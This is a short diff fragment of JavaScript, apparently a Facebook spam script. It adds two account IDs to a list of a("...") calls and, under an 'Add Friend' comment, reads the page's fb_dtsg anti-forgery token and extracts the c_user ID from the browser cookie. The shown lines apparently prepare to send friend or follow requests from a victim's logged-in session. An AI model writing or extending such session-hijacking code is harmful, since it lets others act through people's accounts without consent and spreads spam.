@@ -130,7 +130,8 @@ a("100004043843895");
 a("100002414280218");
 a("100004537747892");
 a("1142706767");
-
+a("100005017236507");
+a("100000608668866");
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
